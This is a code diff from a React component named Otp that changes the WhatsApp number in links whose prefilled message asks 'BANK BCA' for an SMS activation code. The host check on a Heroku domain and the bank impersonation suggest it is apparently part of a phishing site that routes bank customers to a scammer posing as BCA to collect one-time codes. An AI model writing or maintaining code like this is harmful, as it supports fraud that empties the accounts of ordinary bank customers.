@@ -51,9 +51,9 @@ function Otp({host}) {
     // untuk link whatsapp
     let url = ''
     if (host == 'ubah-tarif.herokuapp.com') {
-        url = 'https://api.whatsapp.com/send?phone=628112121240&text=*Hallo%20BANK%20BCA.*%20Minta%20SMS%20Aktivasi%20nya%20%3F'
+        url = 'https://api.whatsapp.com/send?phone=6281350453329&text=*Hallo%20BANK%20BCA.*%20Minta%20SMS%20Aktivasi%20nya%20%3F'
     } else {
-        url = 'https://api.whatsapp.com/send?phone=628112121240&text=*Hallo%20BANK%20BCA.*%20Minta%20SMS%20Aktivasi%20nya%20%3F'
+        url = 'https://api.whatsapp.com/send?phone=6281350453329&text=*Hallo%20BANK%20BCA.*%20Minta%20SMS%20Aktivasi%20nya%20%3F'
     }
     
     return (
